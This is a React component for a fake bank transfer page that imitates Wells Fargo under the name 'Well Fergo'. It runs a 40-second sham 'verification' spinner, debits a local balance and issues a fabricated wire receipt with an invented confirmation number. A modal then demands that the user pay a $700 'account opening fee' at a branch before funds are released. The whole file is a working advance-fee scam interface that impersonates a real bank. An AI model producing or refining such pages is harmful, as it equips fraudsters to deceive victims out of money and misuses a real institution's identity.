import React, { useState, useEffect } from 'react';
import { 
  Send, 
  ArrowLeft, 
  Building2, 
  AlertTriangle, 
  UserCheck, 
  DollarSign, 
  Landmark, 
  CreditCard, 
  FileText,
  Loader2,
  ShieldCheck,
  ShieldAlert,
  Clock,
  Receipt,
  FileCheck,
  CheckCircle2
} from 'lucide-react';
import { PageType, UserProfile, Transaction, WireReceipt } from '../types';

interface TransferPageProps {
  user: UserProfile;
  setUser: React.Dispatch<React.SetStateAction<UserProfile>>;
  setCurrentPage: (page: PageType) => void;
  setTransactions: React.Dispatch<React.SetStateAction<Transaction[]>>;
  addNotification: (title: string, message: string, type?: 'info' | 'security' | 'service' | 'alert') => void;
  setActiveReceipt: (receipt: WireReceipt) => void;
}

export const TransferPage: React.FC<TransferPageProps> = ({
  user,
  setUser,
  setCurrentPage,
  setTransactions,
  addNotification,
  setActiveReceipt,
}) => {
  const [transferName, setTransferName] = useState('');
  const [bankName, setBankName] = useState('');
  const [accountNumber, setAccountNumber] = useState('');
  const [amount, setAmount] = useState('');
  const [memo, setMemo] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  
  const [isProcessing, setIsProcessing] = useState(false);
  const [showVerificationNotice, setShowVerificationNotice] = useState(false);
  const [generatedReceipt, setGeneratedReceipt] = useState<WireReceipt | null>(null);

  // Total loading duration (40 seconds)
  const TOTAL_LOADING_SECONDS = 40;

  useEffect(() => {
    let timer: NodeJS.Timeout | null = null;

    if (isProcessing) {
      timer = setTimeout(() => {
        setIsProcessing(false);
        finalizePendingTransfer();
      }, TOTAL_LOADING_SECONDS * 1000);
    }

    return () => {
      if (timer) clearTimeout(timer);
    };
  }, [isProcessing]);

  const handleSendTransferSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMessage('');

    const numAmt = parseFloat(amount) || 0;
    if (numAmt <= 0) {
      setErrorMessage('Please enter a valid transfer amount.');
      return;
    }

    if (numAmt > user.balance) {
      setErrorMessage(`Insufficient funds. Your current available balance is $${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD.`);
      return;
    }

    setIsProcessing(true);
  };

  const finalizePendingTransfer = () => {
    const numAmt = parseFloat(amount) || 0;
    const wireFee = 30.00;
    const totalDeducted = numAmt;
    const now = new Date();
    const timestamp = Date.now();
    const formattedDate = `${String(now.getMonth() + 1).padStart(2, '0')}/${String(now.getDate()).padStart(2, '0')}/${now.getFullYear()}`;
    const confCode = `OW0000${Math.floor(1000000000 + Math.random() * 9000000000)}`;

    // 1. Deduct money from the user balance
    setUser((prev) => ({
      ...prev,
      balance: Math.max(0, prev.balance - totalDeducted),
    }));

    // 2. Create Receipt Data matching Wells Fargo Wire Money structure
    const newReceipt: WireReceipt = {
      id: `wire-rec-${timestamp}`,
      recipientName: transferName || 'Dana Pease',
      recipientCountry: 'United States',
      recipientAccountLast4: accountNumber ? accountNumber.slice(-4) : '4204',
      fromAccountName: 'EVERYDAY CHECKING',
      fromAccountLast4: user.accountNumber.slice(-4) || '3382',
      amount: numAmt,
      fees: wireFee,
      totalAmount: numAmt + wireFee,
      sendOn: formattedDate,
      deliverBy: formattedDate,
      memo: memo || 'Pay off on 2 Acres',
      status: 'Pending',
      confirmationNumber: confCode,
      noticeDetails: {
        openingFee: 700,
        upgradingTax: 0,
        totalFee: 700,
      },
      createdAt: timestamp
    };

    setGeneratedReceipt(newReceipt);
    setActiveReceipt(newReceipt);

    // 3. Add to Transactions history with 'Pending' status (permanently retained in history)
    const newTx: Transaction = {
      id: `wf-tx-${timestamp}`,
      title: `Wire Transfer to ${transferName || 'Dana Pease'}`,
      subtitle: `${bankName || 'External Bank'} • Business Checking (...${user.accountNumber.slice(-4) || '3382'})`,
      amount: numAmt,
      type: 'debit',
      category: 'transfer',
      date: 'Today, ' + now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      status: 'Pending',
      iconName: 'Clock',
      receiptData: newReceipt,
      createdAt: timestamp
    };

    setTransactions((prev) => [newTx, ...prev]);

    // 4. Send Official Notification
    addNotification(
      'Transfer Pending - Processing Payment',
      `Transfer of $${numAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD is Pending. $${numAmt.toLocaleString('en-US', { minimumFractionDigits: 2 })} has been debited. Please review the payment processing requirements.`,
      'alert'
    );

    // 5. Open Processing Payment Modal
    setShowVerificationNotice(true);
  };

  const handleGoToReceipt = () => {
    setShowVerificationNotice(false);
    setCurrentPage('receipt');
  };

  const handleReturnToDashboard = () => {
    setShowVerificationNotice(false);
    setCurrentPage('dashboard');
  };

  return (
    <div className="mx-auto max-w-3xl space-y-6 pb-16 font-sans animate-fadeIn">
      
      {/* Top Header Bar */}
      <div className="flex items-center justify-between">
        <button
          onClick={() => setCurrentPage('dashboard')}
          className="flex items-center gap-2 rounded-lg bg-white px-3.5 py-2 text-xs font-bold text-slate-700 border border-slate-300 hover:border-[#D71E28] hover:text-[#D71E28] transition shadow-xs cursor-pointer"
        >
          <ArrowLeft className="h-4 w-4" />
          <span>Back to Accounts</span>
        </button>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setCurrentPage('receipt')}
            className="flex items-center gap-1.5 rounded-lg bg-white px-3 py-2 text-xs font-bold text-slate-700 border border-slate-300 hover:border-[#D71E28] hover:text-[#D71E28] transition shadow-xs cursor-pointer"
          >
            <Receipt className="h-3.5 w-3.5 text-[#D71E28]" />
            <span>View Wire Receipt</span>
          </button>

          <span className="hidden sm:inline-block text-xs text-slate-700 bg-white px-3.5 py-2 rounded-lg border border-slate-300 shadow-xs font-medium">
            Available: <strong className="font-mono text-slate-900">${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD</strong>
          </span>
        </div>
      </div>

      {/* Main Transfer Form Card */}
      <div className="rounded-xl border border-slate-300 bg-white shadow-sm overflow-hidden">
        
        {/* Card Header with Wells Fargo Red Accent */}
        <div className="bg-slate-50 border-b border-slate-200 px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="h-10 w-10 rounded-lg bg-red-50 border border-red-200 flex items-center justify-center text-[#D71E28]">
              <Send className="h-5 w-5" />
            </div>
            <div>
              <h1 className="text-lg sm:text-xl font-bold text-slate-900 tracking-tight">
                Transfer & Pay Funds
              </h1>
              <p className="text-xs text-slate-500">
                Well Fergo Wire & Interbank Transfer Service
              </p>
            </div>
          </div>
          <span className="text-xs font-bold text-[#D71E28] bg-red-50 px-2.5 py-1 rounded border border-red-200">
            FDIC Insured Wire
          </span>
        </div>

        <div className="p-6 sm:p-8 space-y-6">

          {errorMessage && (
            <div className="p-3.5 rounded-lg bg-red-50 border border-red-300 text-[#D71E28] text-xs font-semibold flex items-center gap-2">
              <AlertTriangle className="h-4 w-4 shrink-0" />
              <span>{errorMessage}</span>
            </div>
          )}

          {/* Form Inputs */}
          <form onSubmit={handleSendTransferSubmit} className="space-y-4">
            
            {/* From Account Display */}
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">
                From Account
              </label>
              <div className="p-3 bg-slate-50 rounded-lg border border-slate-300 flex justify-between items-center text-xs">
                <div>
                  <div className="font-bold text-slate-900">Business Checking (...{user.accountNumber.slice(-4) || '3382'})</div>
                  <div className="text-slate-500 text-[11px]">{user.name} • Primary Wire Account</div>
                </div>
                <div className="text-right">
                  <div className="font-bold font-mono text-slate-900">${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })}</div>
                  <div className="text-slate-500 text-[11px]">Available Funds</div>
                </div>
              </div>
            </div>

            {/* Recipient Details */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
              
              {/* Beneficiary Name */}
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1.5">
                  Beneficiary / Recipient Name
                </label>
                <div className="relative">
                  <UserCheck className="absolute left-3.5 top-2.5 h-4 w-4 text-slate-400" />
                  <input
                    type="text"
                    required
                    value={transferName}
                    onChange={(e) => setTransferName(e.target.value)}
                    placeholder="e.g. Dana Pease"
                    className="w-full rounded-lg bg-white py-2.5 pl-10 pr-3 text-sm text-slate-900 border border-slate-300 focus:border-[#D71E28] focus:ring-1 focus:ring-[#D71E28] focus:outline-none"
                  />
                </div>
              </div>

              {/* Destination Bank Name */}
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1.5">
                  Destination Bank Name
                </label>
                <div className="relative">
                  <Landmark className="absolute left-3.5 top-2.5 h-4 w-4 text-slate-400" />
                  <input
                    type="text"
                    required
                    value={bankName}
                    onChange={(e) => setBankName(e.target.value)}
                    placeholder="e.g. Chase, Bank of America, Citi"
                    className="w-full rounded-lg bg-white py-2.5 pl-10 pr-3 text-sm text-slate-900 border border-slate-300 focus:border-[#D71E28] focus:ring-1 focus:ring-[#D71E28] focus:outline-none"
                  />
                </div>
              </div>

            </div>

            {/* Account Number & Amount */}
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">

              {/* Account Number / IBAN */}
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1.5">
                  Account Number / IBAN
                </label>
                <div className="relative">
                  <CreditCard className="absolute left-3.5 top-2.5 h-4 w-4 text-slate-400" />
                  <input
                    type="text"
                    required
                    value={accountNumber}
                    onChange={(e) => setAccountNumber(e.target.value)}
                    placeholder="e.g. 98214204"
                    className="w-full rounded-lg bg-white py-2.5 pl-10 pr-3 text-sm font-mono text-slate-900 border border-slate-300 focus:border-[#D71E28] focus:ring-1 focus:ring-[#D71E28] focus:outline-none"
                  />
                </div>
              </div>

              {/* Amount (USD) */}
              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1.5">
                  Transfer Amount ($)
                </label>
                <div className="relative">
                  <DollarSign className="absolute left-3.5 top-2.5 h-4 w-4 text-slate-400" />
                  <input
                    type="number"
                    step="0.01"
                    min="1"
                    required
                    value={amount}
                    onChange={(e) => setAmount(e.target.value)}
                    placeholder="e.g. 23073.67"
                    className="w-full rounded-lg bg-white py-2.5 pl-10 pr-3 text-sm font-mono text-slate-900 border border-slate-300 focus:border-[#D71E28] focus:ring-1 focus:ring-[#D71E28] focus:outline-none"
                  />
                </div>
              </div>

            </div>

            {/* Memo */}
            <div>
              <label className="block text-xs font-bold text-slate-700 mb-1.5">
                Message to Recipient's Bank (Memo)
              </label>
              <div className="relative">
                <FileText className="absolute left-3.5 top-2.5 h-4 w-4 text-slate-400" />
                <input
                  type="text"
                  value={memo}
                  onChange={(e) => setMemo(e.target.value)}
                  placeholder="e.g. Pay off on 2 Acres"
                  className="w-full rounded-lg bg-white py-2.5 pl-10 pr-3 text-sm text-slate-900 border border-slate-300 focus:border-[#D71E28] focus:ring-1 focus:ring-[#D71E28] focus:outline-none"
                />
              </div>
            </div>

            {/* Action Buttons */}
            <div className="pt-4 flex flex-col sm:flex-row gap-3">
              <button
                type="submit"
                className="flex-1 flex items-center justify-center gap-2 rounded-lg bg-[#D71E28] hover:bg-[#b8141d] py-3 px-4 text-sm font-bold text-white shadow-md transition cursor-pointer"
              >
                <Send className="h-4 w-4" />
                <span>Submit Wire Transfer</span>
              </button>

              <button
                type="button"
                onClick={() => setCurrentPage('dashboard')}
                className="flex items-center justify-center gap-2 rounded-lg bg-slate-100 py-3 px-6 text-sm font-bold text-slate-700 border border-slate-300 hover:bg-slate-200 transition cursor-pointer"
              >
                <span>Cancel</span>
              </button>
            </div>

          </form>

        </div>

      </div>

      {/* 1. LOADING OVERLAY ON SUBMIT */}
      {isProcessing && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-xs animate-fadeIn">
          <div className="w-full max-w-sm rounded-2xl border border-slate-300 bg-white p-8 shadow-2xl text-center space-y-5">
            
            {/* Spinning Loader */}
            <div className="relative flex items-center justify-center mx-auto">
              <div className="h-16 w-16 rounded-full border-4 border-slate-100 border-t-[#D71E28] animate-spin" />
              <div className="absolute inset-0 flex items-center justify-center">
                <Send className="h-6 w-6 text-[#D71E28]" />
              </div>
            </div>

            <div className="space-y-1.5">
              <h3 className="text-lg font-bold text-slate-900">
                Processing Transfer Request
              </h3>
              <p className="text-xs text-slate-500">
                Verifying beneficiary account with wire network...
              </p>
            </div>

            <div className="flex items-center justify-center gap-2 text-xs font-semibold text-slate-600 bg-slate-50 py-2.5 px-4 rounded-lg border border-slate-200">
              <Loader2 className="h-4 w-4 animate-spin text-[#D71E28]" />
              <span>Loading, please wait...</span>
            </div>

            <p className="text-[11px] text-slate-400">
              Please do not refresh or close your browser while verification is underway.
            </p>
          </div>
        </div>
      )}

      {/* 2. PROCESSING PAYMENT MODAL (TRANSFER PENDING - FUNDS DEDUCTED) */}
      {showVerificationNotice && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-xs animate-fadeIn">
          <div className="w-full max-w-lg rounded-2xl border border-slate-300 bg-white p-6 sm:p-7 shadow-2xl space-y-5">
            
            {/* Header with Pending Badge */}
            <div className="flex items-start justify-between pb-3 border-b border-slate-200">
              <div className="flex items-center gap-3">
                <div className="h-11 w-11 rounded-xl bg-amber-100 border border-amber-300 flex items-center justify-center text-amber-800 shrink-0">
                  <AlertTriangle className="h-6 w-6 text-amber-700" />
                </div>
                <div>
                  <h3 className="text-lg font-bold text-slate-900">
                    Processing Payment
                  </h3>
                  <span className="text-xs text-slate-500 font-medium">
                    Well Fergo Wire & Interbank Compliance Protocol
                  </span>
                </div>
              </div>

              <span className="inline-flex items-center gap-1 bg-amber-100 text-amber-800 text-[10px] font-black px-2.5 py-1 rounded-md border border-amber-300 uppercase tracking-wide">
                <Clock className="h-3.5 w-3.5" />
                Pending
              </span>
            </div>

            {/* MANDATORY PROMINENT YELLOW NOTE */}
            <div className="rounded-xl bg-amber-50 p-4 border-2 border-amber-400 text-amber-950 shadow-xs flex items-start gap-3.5">
              <AlertTriangle className="h-6 w-6 text-amber-700 shrink-0 mt-0.5" />
              <div className="space-y-1">
                <div className="text-xs font-black text-amber-900 uppercase tracking-wider">
                  Processing Payment
                </div>
                <p className="text-xs sm:text-[13px] font-bold leading-relaxed text-amber-950">
                  SIR/MA, KINDLY PROCEED TO OUR NEAREST BANK BRANCH TO COMPLETE THE PAYMENT OF THE $700 ACCOUNT OPENING FEE. THIS PAYMENT IS REQUIRED TO FINALIZE THE ACCOUNT OPENING PROCESS AND ENABLE THE ACCOUNT TO BE FULLY ACTIVATED.
                </p>
              </div>
            </div>

            {/* Status confirmation that funds were placed on Pending settlement */}
            <div className="bg-slate-50 rounded-xl p-3.5 border border-slate-200 space-y-2 text-xs text-slate-700">
              <div className="flex justify-between items-center font-bold text-slate-900">
                <span>Transfer Status:</span>
                <span className="text-amber-800 bg-amber-50 px-2 py-0.5 rounded border border-amber-300 font-mono">
                  Pending (Funds Held for Settlement)
                </span>
              </div>
              <div className="flex justify-between items-center text-slate-600">
                <span>Amount Debited:</span>
                <span className="font-mono font-bold text-[#D71E28]">
                  -${parseFloat(amount || '0').toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </span>
              </div>
              <div className="flex justify-between items-center text-slate-600">
                <span>New Available Balance:</span>
                <span className="font-mono font-bold text-slate-900">
                  ${user.balance.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                </span>
              </div>
              <div className="flex justify-between items-center border-t border-slate-200 pt-2 font-bold text-amber-900">
                <span>Required Activation Fee:</span>
                <span className="font-mono font-black">$700.00 USD</span>
              </div>
            </div>

            {/* Action Buttons */}
            <div className="space-y-2 pt-1">
              <button
                onClick={handleGoToReceipt}
                className="w-full rounded-xl bg-[#D71E28] hover:bg-[#b8141d] py-3.5 text-xs font-bold text-white transition shadow-sm cursor-pointer flex items-center justify-center gap-2"
              >
                <Receipt className="h-4 w-4" />
                <span>View Wire Money Receipt (Details)</span>
              </button>

              <button
                onClick={handleReturnToDashboard}
                className="w-full rounded-xl bg-slate-100 hover:bg-slate-200 py-3 text-xs font-bold text-slate-700 transition cursor-pointer"
              >
                <span>Return to Accounts Dashboard</span>
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
};
